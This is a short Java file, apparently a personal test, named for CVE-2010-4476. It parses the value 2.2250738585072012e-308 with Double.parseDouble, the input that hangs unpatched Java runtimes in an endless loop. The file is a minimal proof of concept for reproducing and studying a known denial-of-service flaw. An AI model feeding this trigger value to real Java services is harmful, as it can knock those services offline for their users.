package net.wwang.bug;

/**
 * @BelongsProject: wwang
 * @BelongsPackage: net.wwang.bug
 * @Author: WangWei
 * @CreateTime: 2020-04-27 16:31
 * @Description:
 */
public class CVE_2010_4476 {
    public static void main(String[] args) {
        double d = 2.2250738585072012e-308;
        double f = Double.parseDouble("2.2250738585072012e-308");
        System.out.println(f);
    }
}
